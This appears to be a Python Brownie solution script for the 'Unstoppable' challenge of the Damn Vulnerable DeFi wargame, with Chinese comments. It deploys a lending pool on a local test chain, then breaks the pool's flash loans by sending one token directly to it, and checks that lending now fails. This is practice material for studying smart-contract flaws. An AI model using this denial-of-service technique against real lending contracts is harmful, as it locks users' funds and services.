from brownie import ReceiverUnstoppable, UnstoppableLender, DamnValuableToken
from web3 import Web3
import time
from scripts.helpful_scripts import get_accounts


def deploy():
    global someUser, receiverContract, token, pool, INITIAL_ATTACKER_BALANCE, attacker
    [deployer, attacker, someUser] = get_accounts(3)
    # Pool has 1M * 10**18 tokens
    TOKENS_IN_POOL = Web3.toWei(1000000, "ether")
    INITIAL_ATTACKER_BALANCE = Web3.toWei(100, "ether")
    # 开始部署
    token = DamnValuableToken.deploy({"from": deployer})
    pool = UnstoppableLender.deploy(token, {"from": deployer})

    # 执行sol函数
    token.approve(pool, TOKENS_IN_POOL, {"from": deployer}).wait(1)
    pool.depositTokens(TOKENS_IN_POOL, {"from": deployer}).wait(1)
    token.transfer(attacker, INITIAL_ATTACKER_BALANCE, {"from": deployer}).wait(1)
    assert token.balanceOf(pool) == TOKENS_IN_POOL
    assert token.balanceOf(attacker) == INITIAL_ATTACKER_BALANCE

    receiverContract = ReceiverUnstoppable.deploy(pool, {"from": someUser})
    # flash: 拍出、发出， loan:借出，贷款
    receiverContract.executeFlashLoan(10, {"from": someUser}).wait(1)


def attack():
    # 攻击代码写到这里
    token.transfer(pool, 1, {"from": attacker}).wait(1)
    return


def check():
    # 检测攻击是否完成： 不能继续借贷
    print("running func check..")
    try:
        receiverContract.executeFlashLoan(10, {"from": someUser}).wait(1)
        time.sleep(1)
        print("Not pass yet ;(")
    except:
        time.sleep(1)
        print("success!")


def main():
    deploy()
    attack()
    check()
